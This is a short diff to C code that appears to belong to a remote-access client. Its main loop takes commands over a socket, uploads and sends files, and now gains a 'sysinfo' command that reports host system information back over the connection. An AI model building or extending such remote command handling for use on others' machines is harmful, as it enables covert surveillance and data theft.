@@ -11,6 +11,7 @@
 #include <libgen.h>
 #include <signal.h>
 #include "../src/base64.c"
+#include "../src/sysInfoLin.c"
 
 // Definiciones
 #define SOCKBUFF 2048
@@ -208,7 +209,7 @@ int uploadFunc(char *command, int conn){
     free(downloadedData);
     free(file);
     return 0;
-}
+} 
 
 int readNdSndFle(int conn, char *file){
     setlocale(LC_ALL, "en_US.UTF-8");   
@@ -273,8 +274,12 @@ int mainLoop(int conn){
         }
         else if (strstr(instruct, "upload") != NULL)
             uploadFunc(instruct, conn);
-
-        else
+        
+        else if (strcmp(instruct, "sysinfo") == 0){
+            srtSysInfo(conn);
+            send(conn, "end\0", strlen("end\0"), 0);
+        
+        } else
             continue;
     }
     return 0;
